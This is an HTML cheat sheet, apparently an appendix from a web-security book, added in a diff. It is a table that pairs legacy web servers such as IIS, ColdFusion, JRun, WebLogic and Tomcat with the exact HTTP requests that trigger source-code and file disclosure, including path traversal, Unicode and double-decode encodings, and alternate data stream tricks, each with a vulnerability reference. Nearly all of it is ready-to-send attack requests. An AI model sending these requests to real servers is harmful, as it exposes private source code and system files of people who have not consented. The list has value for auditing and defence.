@@ -1,0 +1,914 @@
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=Generator content="Microsoft Word 10 (filtered)">
+<title>Source Code, File, and Directory Disclosure Cheat Sheet</title>
+
+<style>
+<!--
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin:0cm;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman";}
+h2
+	{margin-right:0cm;
+	margin-left:0cm;
+	font-size:18.0pt;
+	font-family:"Times New Roman";
+	color:#354278;}
+h5
+	{margin-right:0cm;
+	margin-left:0cm;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	color:#354278;}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;}
+p.doctext, li.doctext, div.doctext
+	{margin-right:0cm;
+	margin-left:0cm;
+	font-size:10.5pt;
+	font-family:"Times New Roman";
+	color:black;}
+span.docemphasis1
+	{font-style:italic;}
+@page Section1
+	{size:595.3pt 841.9pt;
+	margin:3.0cm 2.0cm 3.0cm 2.0cm;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+
+</head>
+
+<body lang=DA link=blue vlink=purple>
+
+<div class=Section1>
+
+<p class=doctext><span lang=EN-GB>This appendix contains a list of all the
+major source code disclosure techniques discovered over the years. Many of them
+are specific to particular bugs in particular versions of software. </span>Others
+are generic across platforms and have been known to reappear contrary to what
+the vendors say.</p>
+
+<table class=MsoNormalTable border=1 cellspacing=0 cellpadding=0 width="100%"
+ style='width:100.0%'>
+ <tr>
+  <td colspan=3 style='border:none;padding:.75pt .75pt .75pt .75pt'>
+  <h5 align=center style='text-align:center'><a name=app04table01></a><span
+  style='font-size:10.5pt;font-family:Arial'>Source Code, File, and
+  Directory Disclosure Cheat Sheet</span></h5>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span class=docemphasis1><b><span style='font-size:10.5pt;
+  font-family:Arial;color:black'>Vulnerable Application</span></b></span><b><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></b></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span class=docemphasis1><b><span style='font-size:10.5pt;
+  font-family:Arial;color:black'>HTTP Request</span></b></span><b><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></b></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span class=docemphasis1><b><span style='font-size:10.5pt;
+  font-family:Arial;color:black'>Vulnerability Information</span></b></span><b><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></b></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Allaire ColdFusion </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /CFDOCS/snippets/viewexample.cfm?viewexample.cfm Tagname=<span
+  class=docemphasis1>&lt;relative path to CFM file&gt;</span> HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/115" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/115</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Allaire JRun Alternative Data Stream </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file.jsp::$DATA HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/3664" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/3664</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Allaire JRun Server Side Include </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>GET /file HTTP/1.0</p>
+  <p class=doctext>Content Length: <span class=docemphasis1>&lt;length of
+  filename + 28&gt;</span> &lt;!—#include virtual=&quot;<span
+  class=docemphasis1>&lt;filename&gt;</span>&quot;—&gt;</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/3589" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/3589</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Apache Tomcat %70 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /file.js%70 HTTP/1.0</p>
+  <p class=doctext>2. GET /file%252ejsp HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2527" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2527</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>BEA WebLogic Case Sensitive File Extension </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /file.JSP HTTP/1.0</p>
+  <p class=doctext>2. GET /file.jsP HTTP/1.0</p>
+  <p class=doctext>3. GET /file.Jsp HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1328" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1328</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>BEA WebLogic 5.1 %70 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file.js%70 HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2527" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2527</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>BEA WebLogic FileServlet </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /ConsoleHelp/file.jsp HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1518" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1518</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>BEA WebLogic /file/ </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file/file.jsp HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1378" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1378</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>BEA WebLogic /*.shtml/ </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /*.shtml/file.jsp HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1517" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1517</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>IBM WebSphere Case Sensitive File Extension </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /file.JSP HTTP/1.0</p>
+  <p class=doctext>2. GET /file.jsP HTTP/1.0</p>
+  <p class=doctext>3. GET /file.Jsp HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1328" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1328</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>IBM WebSphere /servlet/file/ </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /servlet/file/file.jsp HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1500" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1500</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS 4.0 + FAT Filesystem </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file.%E2%73%70 HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2909" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2909</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS 4.0 Alternative Data Stream </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file::$DATA HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/149" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/149</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS +.htr </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file.asp+.htr HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1488" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1488</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS Translate: f </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file.asp HTTP/1.0 Translate: f </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1578" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1578</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS 3.0 %2e </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file%2easp HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1814" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1814</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS 2.0/3.0 Append &quot;.&quot; </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /file.asp. HTTP/1.0</p>
+  <p class=doctext>2. GET /file.pl HTTP/1.0</p>
+  <p class=doctext>3. GET /file.asp%2e HTTP/1.0</p>
+  <p class=doctext>4. GET /file.pl%2e HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2074" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2074</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Oracle /_pages/ </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /_pages/ HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Sun Java Web Server .jhtml </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /file.jhtml. HTTP/1.0</p>
+  <p class=doctext>2. GET /file.jhtml\HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1891" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1891</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span class=docemphasis1><span style='font-size:10.5pt;
+  font-family:Arial;color:black'>File Disclosure</span></span><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> <span
+  class=docemphasis1>Vulnerable Application</span> </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span class=docemphasis1><span style='font-size:10.5pt;
+  font-family:Arial;color:black'>HTTP Request</span></span><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span class=docemphasis1><span style='font-size:10.5pt;
+  font-family:Arial;color:black'>Vulnerability Information</span></span><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Allaire ColdFusion Server exprcalc.cfm </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /cfdocs/expeval/ExprCalc.cfm?OpenFile Path=c:\file HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/115" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/115</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Allaire ColdFusion openfile.cfm </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /cfdocs/expeval/openfile.cfm ?????????? HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/115" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/115</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Allaire ColdFusion sourcewindow.cfm </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /cfdocs/exampleapp/docs/sourcewindow.cfm?Template=../../file
+  HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/115" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/115</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Allaire JRun /servlet/ </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /servlet/ssiservlet/../../file HTTP/1.0</p>
+  <p class=doctext>2. GET /servlet/com.livesoftware.jrun
+  plugins.ssi.SSIFilter/../../file HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1833" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1833</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Apache Web Server + PHP.EXE for Win32 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /php/php.exe?c:\file HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/3786" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/3786</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Apache Web Server + PHP3 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file.php3.%5c../..%5c<span class=docemphasis1>&lt;relative
+  path to file</span>&gt; HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2060" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2060</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS Unicode </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /scripts/..%c1%1c../<span class=docemphasis1>&lt;relative
+  path to file&gt;</span> HTTP/1.0</p>
+  <p class=doctext>2. GET /scripts/..%c0%9v../<span class=docemphasis1>&lt;</span>
+  <span class=docemphasis1>relative path to file&gt;</span> HTTP/1.0</p>
+  <p class=doctext>3. GET /scripts/..%c0%af../<span class=docemphasis1>&lt;</span>
+  <span class=docemphasis1>relative path to file&gt;</span> HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1806" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1806</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS Double Decode </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /scripts/..%255c..%255c<span class=docemphasis1>&lt;relative
+  path to file&gt;</span> HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2708" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2708</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS %20.htr </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file%20(&quot;%20&quot; repeated 230 times).htr HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1191" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1191</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS idq.dll </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /query.idq?CiTemplate=<span class=docemphasis1>&lt;relative
+  path to file&gt; HTTP/1.0</span> </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/968" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/968</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS showcode.asp </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/<span
+  class=docemphasis1>&lt;relative path to file&gt;</span> HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/167" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/167</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS codebrws.asp </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /iissamples/exair/howitworks/ codebrws.asp?source=<span
+  class=docemphasis1>&lt;relative path to file&gt;</span> HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/167" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/167</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS viewcode.asp </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /Sites/Knowledge/Membership/
+  Inspired/ViewCode.asp?source=<span class=docemphasis1>&lt;relative path to
+  file&gt;</span> HTTP/1.0</p>
+  <p class=doctext>2. GET /Sites/Knowledge/Membership/ <span
+  class=docemphasis1>Inspiredtutorial</span>/ViewCode.asp?source=<span
+  class=docemphasis1>&lt;relative path to file&gt;</span> HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a
+  href="http://support.microsoft.com/directory/article.asp?id=kb;en-us;q231656&amp;"
+  target="_blank"><span style='color:#003399'>http://support.microsoft.com/directory/article.asp?ID=KB;EN-US;Q231656&amp;</span></a>;
+  </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>&nbsp;</span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>3. GET /Sites/Samples/Knowledge/
+  Membership/Inspired/ViewCode.asp? source=<span class=docemphasis1>&lt;relative
+  path to file&gt;</span> HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>&nbsp;</span></p>
+  </td>
+ </tr>
